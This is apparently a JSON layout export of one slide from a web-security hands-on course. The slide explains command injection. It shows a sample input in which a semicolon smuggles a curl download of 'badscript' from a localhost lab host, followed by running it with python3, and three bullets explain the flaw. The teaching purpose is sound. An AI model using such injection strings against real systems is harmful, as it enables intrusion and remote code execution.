@@ -1,0 +1,495 @@
+{
+  "schema": "openai.presentation.layout/v4",
+  "unit": "px",
+  "slide": {
+    "aid": "sl/90je9cvi",
+    "id": "90je9cvi",
+    "slide": 80,
+    "layoutId": "/ppt/slideLayouts/slideLayout1.xml",
+    "layoutName": "DEFAULT",
+    "masterLayoutId": "/ppt/slideMasters/slideMaster1.xml",
+    "backgroundColor": "#FFFFFF",
+    "frame": {
+      "left": 0,
+      "top": 0,
+      "width": 1280,
+      "height": 720
+    }
+  },
+  "theme": {
+    "colorSchemeName": "Office",
+    "colors": {
+      "accent1": "#4472C4",
+      "accent2": "#ED7D31",
+      "accent3": "#A5A5A5",
+      "accent4": "#FFC000",
+      "accent5": "#5B9BD5",
+      "accent6": "#70AD47",
+      "dk1": "#000000",
+      "lt1": "#FFFFFF",
+      "dk2": "#44546A",
+      "lt2": "#E7E6E6",
+      "hlink": "#0563C1",
+      "folHlink": "#954F72"
+    },
+    "typefaces": [
+      "+mn-lt",
+      "Aptos",
+      "Aptos Display",
+      "Menlo"
+    ]
+  },
+  "inheritedLayers": [
+    {
+      "scope": "layout",
+      "id": "/ppt/slideLayouts/slideLayout1.xml",
+      "name": "DEFAULT",
+      "parentLayoutId": "/ppt/slideMasters/slideMaster1.xml",
+      "elements": []
+    },
+    {
+      "scope": "master",
+      "id": "/ppt/slideMasters/slideMaster1.xml",
+      "type": "master",
+      "elements": []
+    }
+  ],
+  "elements": [
+    {
+      "order": 1,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/ahoza1gv",
+      "id": "2",
+      "name": "Shape 0",
+      "bbox": [
+        0,
+        0,
+        21.12,
+        720
+      ],
+      "geometry": "rect",
+      "fillColor": "#0F766E",
+      "lineColor": "#0F766E",
+      "lineWidth": 1.33
+    },
+    {
+      "order": 2,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/32lszqtc",
+      "id": "3",
+      "name": "Text 1",
+      "bbox": [
+        63.36,
+        34.56,
+        220.8,
+        17.28
+      ],
+      "geometry": "rect",
+      "text": "FOUNDATION",
+      "textPreview": "FOUNDATION",
+      "resolvedFontSize": 24,
+      "resolvedTextStyle": {
+        "fontSize": 24,
+        "typeface": "+mn-lt",
+        "alignment": "left"
+      },
+      "textLayout": {
+        "lineCount": 1,
+        "lines": [
+          {
+            "index": 1,
+            "text": "FOUNDATION"
+          }
+        ]
+      },
+      "paragraphs": [
+        {
+          "index": 1,
+          "text": "FOUNDATION",
+          "runs": [
+            {
+              "index": 1,
+              "text": "FOUNDATION",
+              "fontSize": 9.33,
+              "typeface": "Aptos",
+              "color": "#0F766E",
+              "bold": true
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "order": 3,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/szqtcj6t",
+      "id": "4",
+      "name": "Text 2",
+      "bbox": [
+        63.36,
+        64.32,
+        1142.4,
+        46.08
+      ],
+      "geometry": "rect",
+      "text": "Observation 5: Command Injection",
+      "textPreview": "Observation 5: Command Injection",
+      "resolvedFontSize": 24,
+      "resolvedTextStyle": {
+        "fontSize": 24,
+        "typeface": "+mn-lt",
+        "alignment": "left"
+      },
+      "textLayout": {
+        "lineCount": 1,
+        "lines": [
+          {
+            "index": 1,
+            "text": "Observation 5: Command Injection"
+          }
+        ]
+      },
+      "paragraphs": [
+        {
+          "index": 1,
+          "text": "Observation 5: Command Injection",
+          "runs": [
+            {
+              "index": 1,
+              "text": "Observation 5: Command Injection",
+              "fontSize": 34.67,
+              "typeface": "Aptos Display",
+              "color": "#111827",
+              "bold": true
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "order": 4,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/lkjm1cfa",
+      "id": "5",
+      "name": "Shape 3",
+      "bbox": [
+        63.36,
+        122.88,
+        1147.2,
+        0
+      ],
+      "geometry": "line",
+      "lineColor": "#CBD5E1",
+      "lineWidth": 1.33
+    },
+    {
+      "order": 5,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/at47y1kr",
+      "id": "6",
+      "name": "Text 4",
+      "bbox": [
+        78.72,
+        148.8,
+        1108.8,
+        26.88
+      ],
+      "geometry": "rect",
+      "text": "Example boundary break:",
+      "textPreview": "Example boundary break:",
+      "resolvedFontSize": 24,
+      "resolvedTextStyle": {
+        "fontSize": 24,
+        "typeface": "+mn-lt",
+        "alignment": "left"
+      },
+      "textLayout": {
+        "lineCount": 1,
+        "lines": [
+          {
+            "index": 1,
+            "text": "Example boundary break:"
+          }
+        ]
+      },
+      "paragraphs": [
+        {
+          "index": 1,
+          "text": "Example boundary break:",
+          "runs": [
+            {
+              "index": 1,
+              "text": "Example boundary break:",
+              "fontSize": 19.73,
+              "typeface": "Aptos",
+              "color": "#1F2937"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "order": 6,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/3ex0nuxc",
+      "id": "7",
+      "name": "Shape 5",
+      "bbox": [
+        75.84,
+        192.96,
+        1108.8,
+        62.4
+      ],
+      "geometry": "roundRect",
+      "fillColor": "#F3F4F6",
+      "lineColor": "#E5E7EB",
+      "lineWidth": 0.93
+    },
+    {
+      "order": 7,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/w3m94fu1",
+      "id": "8",
+      "name": "Text 6",
+      "bbox": [
+        94.08,
+        210.24,
+        1078.08,
+        37.44
+      ],
+      "geometry": "rect",
+      "text": "echo 'message' >> mail.txt ; curl -s http://localhost:8090/badscript -o bad.py ; python3 bad.py",
+      "textPreview": "echo 'message' >> mail.txt ; curl -s http://localhost:8090/badscript -o bad.py ; python3 bad.py",
+      "resolvedFontSize": 24,
+      "resolvedTextStyle": {
+        "fontSize": 24,
+        "typeface": "+mn-lt",
+        "alignment": "left"
+      },
+      "textLayout": {
+        "lineCount": 1,
+        "lines": [
+          {
+            "index": 1,
+            "text": "echo 'message' >> mail.txt ; curl -s http://localhost:8090/badscript -o bad.py ; python3 bad.py"
+          }
+        ]
+      },
+      "paragraphs": [
+        {
+          "index": 1,
+          "text": "echo 'message' >> mail.txt ; curl -s http://localhost:8090/badscript -o bad.py ; python3 bad.py",
+          "runs": [
+            {
+              "index": 1,
+              "text": "echo 'message' >> mail.txt ; curl -s http://localhost:8090/badscript -o bad.py ; python3 bad.py",
+              "fontSize": 9.87,
+              "typeface": "Menlo",
+              "color": "#111827"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "order": 8,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/loj2t83i",
+      "id": "9",
+      "name": "Text 7",
+      "bbox": [
+        78.72,
+        277.44,
+        1108.8,
+        73.41
+      ],
+      "geometry": "rect",
+      "text": "- ; ends the intended command and starts another command.\n- User input is interpreted as shell syntax, not as text.\n- The attacker-controlled command runs after the original command.",
+      "textPreview": "- ; ends the intended command and starts another command. | - User input is interpreted as shell syntax, not as text. | - The attacker-co...",
+      "resolvedFontSize": 24,
+      "resolvedTextStyle": {
+        "fontSize": 24,
+        "typeface": "+mn-lt",
+        "alignment": "left"
+      },
+      "textLayout": {
+        "lineCount": 3,
+        "lines": [
+          {
+            "index": 1,
+            "text": "- ; ends the intended command and starts another command."
+          },
+          {
+            "index": 2,
+            "text": "- User input is interpreted as shell syntax, not as text."
+          },
+          {
+            "index": 3,
+            "text": "- The attacker-controlled command runs after the original command."
+          }
+        ]
+      },
+      "paragraphs": [
+        {
+          "index": 1,
+          "text": "- ; ends the intended command and starts another command.",
+          "runs": [
+            {
+              "index": 1,
+              "text": "- ; ends the intended command and starts another command.",
+              "fontSize": 19.73,
+              "typeface": "Aptos",
+              "color": "#1F2937"
+            }
+          ]
+        },
+        {
+          "index": 2,
+          "text": "- User input is interpreted as shell syntax, not as text.",
+          "runs": [
+            {
+              "index": 1,
+              "text": "- User input is interpreted as shell syntax, not as text.",
+              "fontSize": 19.73,
+              "typeface": "Aptos",
+              "color": "#1F2937"
+            }
+          ]
+        },
+        {
+          "index": 3,
+          "text": "- The attacker-controlled command runs after the original command.",
+          "runs": [
+            {
+              "index": 1,
+              "text": "- The attacker-controlled command runs after the original command.",
+              "fontSize": 19.73,
+              "typeface": "Aptos",
+              "color": "#1F2937"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "order": 9,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/9knih4by",
+      "id": "10",
+      "name": "Text 8",
+      "bbox": [
+        64.32,
+        689.28,
+        403.2,
+        14.4
+      ],
+      "geometry": "rect",
+      "text": "webapp-security-programming-handson",
+      "textPreview": "webapp-security-programming-handson",
+      "resolvedFontSize": 24,
+      "resolvedTextStyle": {
+        "fontSize": 24,
+        "typeface": "+mn-lt",
+        "alignment": "left"
+      },
+      "textLayout": {
+        "lineCount": 1,
+        "lines": [
+          {
+            "index": 1,
+            "text": "webapp-security-programming-handson"
+          }
+        ]
+      },
+      "paragraphs": [
+        {
+          "index": 1,
+          "text": "webapp-security-programming-handson",
+          "runs": [
+            {
+              "index": 1,
+              "text": "webapp-security-programming-handson",
+              "fontSize": 8.67,
+              "typeface": "Aptos",
+              "color": "#7B8794"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "order": 10,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/kzupwb2h",
+      "id": "11",
+      "name": "Text 9",
+      "bbox": [
+        1142.4,
+        689.28,
+        72,
+        14.4
+      ],
+      "geometry": "rect",
+      "text": "79 / 105",
+      "textPreview": "79 / 105",
+      "resolvedFontSize": 24,
+      "resolvedTextStyle": {
+        "fontSize": 24,
+        "typeface": "+mn-lt",
+        "alignment": "left"
+      },
+      "textLayout": {
+        "lineCount": 1,
+        "lines": [
+          {
+            "index": 1,
+            "text": "79 / 105"
+          }
+        ]
+      },
+      "paragraphs": [
+        {
+          "index": 1,
+          "text": "79 / 105",
+          "runs": [
+            {
+              "index": 1,
+              "text": "79 / 105",
+              "fontSize": 8.67,
+              "typeface": "Aptos",
+              "color": "#7B8794"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "order": 11,
+      "kind": "shape",
+      "scope": "slide",
+      "aid": "sh/re1w7mp0",
+      "id": "12",
+      "name": "Shape 10",
+      "bbox": [
+        64.32,
+        675.84,
+        1147.2,
+        0
+      ],
+      "geometry": "line",
+      "lineColor": "#E5E7EB",
+      "lineWidth": 1.33
+    }
+  ],
+  "composeRuns": []
+}
